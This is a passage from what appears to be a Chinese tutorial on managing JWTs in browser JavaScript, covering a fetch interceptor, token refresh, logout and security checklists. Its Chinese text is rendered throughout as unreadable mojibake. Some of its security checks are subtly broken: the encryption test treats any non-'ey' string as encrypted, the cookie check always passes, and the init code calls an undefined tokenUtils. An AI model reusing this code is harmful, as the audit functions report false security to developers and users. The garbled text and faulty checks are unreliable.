        
        return checklist;
    }
    
    // æ£€æŸ¥CSPè®¾ç½®
    checkCSP() {
        const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        return cspMeta !== null;
    }
    
    // æ£€æŸ¥Cookieå®‰å…¨æ€§
    checkCookieSecurity() {
        const cookies = document.cookie.split(';');
        // ç®€å•æ£€æŸ¥ï¼Œå®é™…éœ€è¦æ£€æŸ¥HttpOnlyã€Secureã€SameSiteç­‰å±æ€§
        return cookies.length > 0;
    }
    
    // æ£€æŸ¥æ•°æ®åŠ å¯†
    checkDataEncryption() {
        // æ£€æŸ¥æ•æ„Ÿæ•°æ®æ˜¯å¦åŠ å¯†å­˜å‚¨
        const token = localStorage.getItem('authToken');
        return !token || this.isEncrypted(token);
    }
    
    // ç®€å•çš„åŠ å¯†æ£€æµ‹
    isEncrypted(data) {
        // ç®€å•åˆ¤æ–­ï¼šJWTé€šå¸¸ä»¥eyå¼€å¤´ï¼Œæ˜æ–‡å­˜å‚¨çš„è¯ä¼šå¾ˆæ˜æ˜¾
        return !data.startsWith('ey'); // ç®€åŒ–åˆ¤æ–­
    }
}

// åˆ›å»ºç»¼åˆå®‰å…¨ç®¡ç†å™¨
const securityManager = new ComprehensiveSecurityManager();

// é¡µé¢åŠ è½½å®Œæˆåæ‰§è¡Œå®‰å…¨å®¡è®¡
window.addEventListener('load', () => {
    setTimeout(() => {
        securityManager.performSecurityAudit();
    }, 1000);
});
```

---

## 8. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 8.1 å¿…é¡»æŒæ¡çš„æ ¸å¿ƒæ¦‚å¿µ


```
ğŸ”¸ Tokenå­˜å‚¨ï¼šLocalStorageæŒä¹…åŒ–ï¼ŒSessionStorageä¼šè¯çº§ï¼ŒCookieè‡ªåŠ¨å‘é€
ğŸ”¸ è¯·æ±‚æºå¸¦ï¼šAuthorizationå¤´Beareræ ¼å¼ï¼Œæ‹¦æˆªå™¨è‡ªåŠ¨å¤„ç†
ğŸ”¸ è¿‡æœŸå¤„ç†ï¼šæ£€æµ‹è¿‡æœŸçŠ¶æ€ï¼Œè‡ªåŠ¨åˆ·æ–°Tokenï¼Œæ— æ„ŸçŸ¥ç»­æœŸ
ğŸ”¸ å®‰å…¨é€€å‡ºï¼šæ¸…é™¤æœ¬åœ°æ•°æ®ï¼Œé€šçŸ¥æœåŠ¡å™¨ï¼Œé‡ç½®åº”ç”¨çŠ¶æ€
ğŸ”¸ æ‹¦æˆªå™¨ï¼šè¯·æ±‚å‰æ·»åŠ Tokenï¼Œå“åº”æ—¶å¤„ç†é”™è¯¯ï¼Œè‡ªåŠ¨é‡è¯•æœºåˆ¶
ğŸ”¸ å®‰å…¨é˜²æŠ¤ï¼šXSSå†…å®¹è¿‡æ»¤ï¼ŒCSRFä»¤ç‰ŒéªŒè¯ï¼Œå®‰å…¨å“åº”å¤´è®¾ç½®
```

### 8.2 å…³é”®ç†è§£è¦ç‚¹


**ğŸ”¹ å­˜å‚¨æ–¹å¼é€‰æ‹©åŸåˆ™**
```
å®‰å…¨æ€§ä¼˜å…ˆï¼šCookie > SessionStorage > LocalStorage
ç”¨æˆ·ä½“éªŒä¼˜å…ˆï¼šLocalStorage > Cookie > SessionStorage
ä¼ä¸šåº”ç”¨ï¼šCookie + HttpOnly + Secure + SameSite
```

**ğŸ”¹ Tokenåˆ·æ–°æœ€ä½³å®è·µ**
```
ä¸»åŠ¨åˆ·æ–°ï¼šæå‰5åˆ†é’Ÿæ£€æµ‹è¿‡æœŸå¹¶åˆ·æ–°
è¢«åŠ¨åˆ·æ–°ï¼š401é”™è¯¯æ—¶è‡ªåŠ¨åˆ·æ–°å¹¶é‡è¯•
é¿å…é‡å¤ï¼šä½¿ç”¨æ ‡å¿—ä½é˜²æ­¢å¤šæ¬¡åŒæ—¶åˆ·æ–°
ç”¨æˆ·ä½“éªŒï¼šåˆ·æ–°å¤±è´¥æ‰è¦æ±‚é‡æ–°ç™»å½•
```

**ğŸ”¹ å®‰å…¨é˜²æŠ¤é‡ç‚¹**
```
XSSé˜²æŠ¤ï¼šè¾“å…¥éªŒè¯ + è¾“å‡ºç¼–ç  + CSPç­–ç•¥
CSRFé˜²æŠ¤ï¼šTokenéªŒè¯ + SameSite + æ¥æºæ£€æŸ¥  
ä¼ è¾“å®‰å…¨ï¼šHTTPS + å®‰å…¨å“åº”å¤´ + åŠ å¯†å­˜å‚¨
```

### 8.3 å®é™…åº”ç”¨æŒ‡å¯¼


**ğŸ’¡ å¼€å‘å»ºè®®**
```
âœ… ä½¿ç”¨æ‹¦æˆªå™¨ç»Ÿä¸€å¤„ç†Token
âœ… å®ç°è‡ªåŠ¨åˆ·æ–°æœºåˆ¶
âœ… æ·»åŠ å®‰å…¨é˜²æŠ¤æªæ–½
âœ… æä¾›å‹å¥½çš„é”™è¯¯æç¤º
âœ… è®°å½•å®‰å…¨ç›¸å…³æ—¥å¿—

âŒ ä¸è¦åœ¨URLä¸­ä¼ é€’Token
âŒ ä¸è¦å¿½ç•¥Tokenè¿‡æœŸå¤„ç†
âŒ ä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨æ˜æ–‡å­˜å‚¨
âŒ ä¸è¦å¿½ç•¥CSRFé˜²æŠ¤
âŒ ä¸è¦ç›¸ä¿¡å‰ç«¯çš„å®‰å…¨éªŒè¯
```

### 8.4 å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ


**ğŸ”§ é—®é¢˜æ’æŸ¥æ¸…å•**

| é—®é¢˜ç°è±¡ | å¯èƒ½åŸå›  | è§£å†³æ–¹æ¡ˆ |
|---------|---------|---------|
| `è¯·æ±‚è¿”å›401` | `Tokenè¿‡æœŸæˆ–æ— æ•ˆ` | `æ£€æŸ¥Tokenæ ¼å¼ï¼Œå®ç°è‡ªåŠ¨åˆ·æ–°` |
| `æ— æ³•è·å–ç”¨æˆ·ä¿¡æ¯` | `Tokenæœªæ­£ç¡®æºå¸¦` | `æ£€æŸ¥Authorizationå¤´è®¾ç½®` |
| `é¢‘ç¹è¦æ±‚é‡æ–°ç™»å½•` | `Tokenå­˜å‚¨ä¸æŒä¹…` | `é€‰æ‹©åˆé€‚çš„å­˜å‚¨æ–¹å¼` |
| `Tokenè¢«çªƒå–` | `XSSæ”»å‡»æ¼æ´` | `åŠ å¼ºè¾“å…¥éªŒè¯å’ŒCSPç­–ç•¥` |
| `è·¨ç«™è¯·æ±‚ä¼ªé€ ` | `ç¼ºå°‘CSRFé˜²æŠ¤` | `å®ç°CSRFä»¤ç‰ŒéªŒè¯` |

**ğŸš€ æ€§èƒ½ä¼˜åŒ–å»ºè®®**
```
ç¼“å­˜ç­–ç•¥ï¼š
â€¢ TokenéªŒè¯ç»“æœç¼“å­˜5åˆ†é’Ÿ
â€¢ ç”¨æˆ·ä¿¡æ¯ç¼“å­˜30åˆ†é’Ÿ
â€¢ APIå“åº”é€‚å½“ç¼“å­˜

ç½‘ç»œä¼˜åŒ–ï¼š
â€¢ ä½¿ç”¨HTTP/2å‡å°‘è¯·æ±‚å¼€é”€
â€¢ å‹ç¼©è¯·æ±‚å’Œå“åº”æ•°æ®
â€¢ å®ç°è¯·æ±‚å»é‡å’Œåˆå¹¶

ç”¨æˆ·ä½“éªŒï¼š
â€¢ æ·»åŠ åŠ è½½çŠ¶æ€æç¤º
â€¢ å®ç°ç¦»çº¿çŠ¶æ€å¤„ç†
â€¢ æä¾›é‡è¯•æœºåˆ¶
```

### 8.5 å®Œæ•´ç¤ºä¾‹ä»£ç æ¨¡æ¿


```javascript
// JWTå‰ç«¯é›†æˆå®Œæ•´ç¤ºä¾‹
class JWTFrontendManager {
    constructor() {
        this.tokenKey = 'authToken';
        this.refreshKey = 'refreshToken';
        this.baseURL = '/api';
        this.setupInterceptors();
    }
    
    // ç™»å½•å¹¶ä¿å­˜Token
    async login(username, password) {
        try {
            const response = await fetch(`${this.baseURL}/auth/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            
            if (response.ok) {
                const data = await response.json();
                this.saveTokens(data.accessToken, data.refreshToken);
                console.log('ç™»å½•æˆåŠŸ');
                return data;
            } else {
                throw new Error('ç™»å½•å¤±è´¥');
            }
        } catch (error) {
            console.error('ç™»å½•é”™è¯¯:', error);
            throw error;
        }
    }
    
    // ä¿å­˜Token
    saveTokens(accessToken, refreshToken) {
        localStorage.setItem(this.tokenKey, accessToken);
        if (refreshToken) {
            localStorage.setItem(this.refreshKey, refreshToken);
        }
    }
    
    // è®¾ç½®è¯·æ±‚æ‹¦æˆªå™¨
    setupInterceptors() {
        const originalFetch = window.fetch;
        
        window.fetch = async (url, options = {}) => {
            // æ·»åŠ Token
            const token = localStorage.getItem(this.tokenKey);
            if (token) {
                options.headers = {
                    ...options.headers,
                    'Authorization': `Bearer ${token}`
                };
            }
            
            let response = await originalFetch(url, options);
            
            // å¤„ç†401é”™è¯¯
            if (response.status === 401 && !options._retry) {
                console.log('Tokenè¿‡æœŸï¼Œå°è¯•åˆ·æ–°...');
                
                try {
                    await this.refreshToken();
                    
                    // é‡è¯•è¯·æ±‚
                    const newToken = localStorage.getItem(this.tokenKey);
                    options.headers.Authorization = `Bearer ${newToken}`;
                    options._retry = true;
                    
                    response = await originalFetch(url, options);
                } catch (refreshError) {
                    console.error('åˆ·æ–°Tokenå¤±è´¥ï¼Œè·³è½¬ç™»å½•');
                    this.logout();
                }
            }
            
            return response;
        };
    }
    
    // åˆ·æ–°Token
    async refreshToken() {
        const refreshToken = localStorage.getItem(this.refreshKey);
        
        if (!refreshToken) {
            throw new Error('æ²¡æœ‰åˆ·æ–°Token');
        }
        
        const response = await fetch(`${this.baseURL}/auth/refresh`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refreshToken })
        });
        
        if (response.ok) {
            const data = await response.json();
            this.saveTokens(data.accessToken, data.refreshToken);
            return data.accessToken;
        } else {
            throw new Error('åˆ·æ–°å¤±è´¥');
        }
    }
    
    // é€€å‡ºç™»å½•
    async logout() {
        try {
            // é€šçŸ¥æœåŠ¡å™¨
            await fetch(`${this.baseURL}/auth/logout`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${localStorage.getItem(this.tokenKey)}`
                }
            });
        } catch (error) {
            console.warn('é€šçŸ¥æœåŠ¡å™¨é€€å‡ºå¤±è´¥:', error);
        }
        
        // æ¸…é™¤æœ¬åœ°æ•°æ®
        localStorage.removeItem(this.tokenKey);
        localStorage.removeItem(this.refreshKey);
        
        // è·³è½¬ç™»å½•é¡µ
        window.location.href = '/login';
    }
    
    // è·å–ç”¨æˆ·ä¿¡æ¯
    async getUserInfo() {
        const response = await fetch(`${this.baseURL}/user/info`);
        
        if (response.ok) {
            return await response.json();
        } else {
            throw new Error('è·å–ç”¨æˆ·ä¿¡æ¯å¤±è´¥');
        }
    }
}

// ä½¿ç”¨ç¤ºä¾‹
const jwtManager = new JWTFrontendManager();

// é¡µé¢åˆå§‹åŒ–
window.addEventListener('DOMContentLoaded', async () => {
    const token = localStorage.getItem('authToken');
    
    if (token && !tokenUtils.isTokenExpired(token)) {
        try {
            const userInfo = await jwtManager.getUserInfo();
            console.log('ç”¨æˆ·å·²ç™»å½•:', userInfo);
            // æ›´æ–°UIæ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯
        } catch (error) {
            console.error('è·å–ç”¨æˆ·ä¿¡æ¯å¤±è´¥:', error);
            jwtManager.logout();
        }
    } else {
        console.log('ç”¨æˆ·æœªç™»å½•æˆ–Tokenå·²è¿‡æœŸ');
        // è·³è½¬ç™»å½•é¡µæˆ–æ˜¾ç¤ºç™»å½•è¡¨å•
    }
});
```

### 8.6 å®‰å…¨æ£€æŸ¥æ¸…å•


**ğŸ”’ ä¸Šçº¿å‰å®‰å…¨æ£€æŸ¥**
```
â˜ Tokenå­˜å‚¨æ–¹å¼é€‰æ‹©åˆç†
â˜ å®ç°äº†è‡ªåŠ¨Tokenåˆ·æ–°
â˜ æ·»åŠ äº†è¯·æ±‚æ‹¦æˆªå™¨
â˜ å®ç°äº†å®‰å…¨é€€å‡ºç™»å½•
â˜ å¯ç”¨äº†CSRFé˜²æŠ¤
â˜ æ·»åŠ äº†XSSé˜²æŠ¤
â˜ ä½¿ç”¨äº†HTTPSåè®®
â˜ è®¾ç½®äº†å®‰å…¨å“åº”å¤´
â˜ å®ç°äº†é”™è¯¯å¤„ç†æœºåˆ¶
â˜ æ·»åŠ äº†å®‰å…¨ç›‘æ§æ—¥å¿—
```

**ğŸ“Š ç›‘æ§æŒ‡æ ‡å»ºè®®**
```
Tokenç›¸å…³ï¼š
â€¢ Tokenåˆ·æ–°æˆåŠŸç‡
â€¢ Tokenè¿‡æœŸé¢‘ç‡
â€¢ ç™»å½•å¤±è´¥æ¬¡æ•°

å®‰å…¨ç›¸å…³ï¼š
â€¢ XSSæ”»å‡»æ£€æµ‹æ¬¡æ•°
â€¢ CSRFæ”»å‡»é˜»æ­¢æ¬¡æ•°
â€¢ å¼‚å¸¸ç™»å½•åœ°ç‚¹ç»Ÿè®¡

ç”¨æˆ·ä½“éªŒï¼š
â€¢ è‡ªåŠ¨ç™»å½•æˆåŠŸç‡
â€¢ æ¥å£å“åº”æ—¶é—´
â€¢ é”™è¯¯ç‡ç»Ÿè®¡
```

### 8.7 å­¦ä¹ è·¯å¾„å»ºè®®


**ğŸ¯ å­¦ä¹ é¡ºåº**
```
1ï¸âƒ£ åŸºç¡€æ¦‚å¿µï¼šç†è§£JWTç»“æ„å’ŒåŸç†
2ï¸âƒ£ å­˜å‚¨æ–¹å¼ï¼šæŒæ¡å„ç§å­˜å‚¨æ–¹æ¡ˆçš„ä¼˜ç¼ºç‚¹
3ï¸âƒ£ è¯·æ±‚å¤„ç†ï¼šå­¦ä¼šåœ¨HTTPè¯·æ±‚ä¸­æ­£ç¡®æºå¸¦Token
4ï¸âƒ£ è¿‡æœŸå¤„ç†ï¼šå®ç°è‡ªåŠ¨åˆ·æ–°å’Œé”™è¯¯å¤„ç†
5ï¸âƒ£ å®‰å…¨é˜²æŠ¤ï¼šæŒæ¡XSSå’ŒCSRFé˜²æŠ¤æŠ€æœ¯
6ï¸âƒ£ å®æˆ˜æ¼”ç»ƒï¼šå®Œæˆå®Œæ•´çš„è®¤è¯ç³»ç»Ÿé›†æˆ
```

**ğŸ“š æ·±å…¥å­¦ä¹ å»ºè®®**
```
è¿›é˜¶ä¸»é¢˜ï¼š
â€¢ OAuth 2.0å®Œæ•´æµç¨‹
â€¢ å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰å®ç°
â€¢ å¾®å‰ç«¯æ¶æ„ä¸‹çš„è®¤è¯
â€¢ ç§»åŠ¨ç«¯Tokenç®¡ç†
â€¢ æœåŠ¡ç«¯Sessionç®¡ç†
```

**æ ¸å¿ƒè®°å¿†å£è¯€**ï¼š
```
å‰ç«¯Tokenä¸‰æ­¥èµ°ï¼šå­˜å‚¨å®‰å…¨é€‰æ–¹å¼
è¯·æ±‚æºå¸¦ç”¨æ‹¦æˆªï¼Œè¿‡æœŸåˆ·æ–°è¦åŠæ—¶
XSSé˜²æŠ¤é è¿‡æ»¤ï¼ŒCSRFä»¤ç‰Œä¸èƒ½ä¸¢
å®‰å…¨é€€å‡ºæ¸…æ•°æ®ï¼Œç›‘æ§æ—¥å¿—åŠ©è°ƒè¯•
```